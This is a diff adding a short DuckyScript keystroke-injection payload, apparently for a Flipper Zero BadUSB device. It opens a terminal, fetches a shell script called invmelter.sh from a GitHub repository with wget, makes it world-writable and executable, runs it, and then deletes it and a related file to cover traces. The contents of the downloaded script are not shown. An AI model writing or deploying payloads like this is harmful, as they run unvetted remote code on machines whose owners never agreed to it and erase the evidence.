@@ -1,0 +1,11 @@
+REM RUN DOWNLOADED .SH
+GUI ENTER
+DELAY 1000
+STRING wget https://raw.githubusercontent.com/knoxoxen/Omarchy-Flipper0-Badusb/main/launchers/invmelter/invmelter.sh
+ENTER
+DELAY 5000
+STRING chmod 777 invmelter.sh
+ENTER
+STRINGLN ./invmelter.sh
+STRING rm -f invmelter.sh invmelter-fx
+ENTER
